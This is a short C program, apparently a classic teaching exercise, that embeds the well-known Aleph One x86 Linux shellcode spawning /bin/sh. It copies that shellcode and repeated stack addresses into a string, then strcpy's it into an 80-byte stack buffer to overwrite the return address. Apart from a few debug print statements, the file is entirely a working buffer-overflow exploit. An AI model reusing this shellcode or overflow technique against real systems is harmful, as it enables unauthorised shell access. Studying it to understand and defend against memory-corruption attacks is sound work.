/*
 * Aleph One shellcode.
 */
#include<stdio.h>

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
char large_str[256];

void main(){
	char buffer[80];
	int i;
	long *long_p = (long*)large_str;

	printf("%i\n", strlen(shellcode));
	printf("1:%x %x %x %x\n",large_str[0],large_str[1],large_str[2],large_str[3]);
	for(i=0;i<32;i++)
		*(long_p+i)=(int)buffer;
	printf("%i\n", strlen(large_str));
	printf("2:%x %x %x %x %x %x %x %x\n",large_str[0],large_str[1],large_str[2],large_str[3], large_str[4], large_str[5], large_str[6],large_str[7]);
	for(i=0;i<strlen(shellcode);i++)
		large_str[i]=shellcode[i];

	printf("3:%x %x %x %x\n",large_str[0],large_str[1],large_str[2],large_str[3]);
	strcpy(buffer,large_str);
}

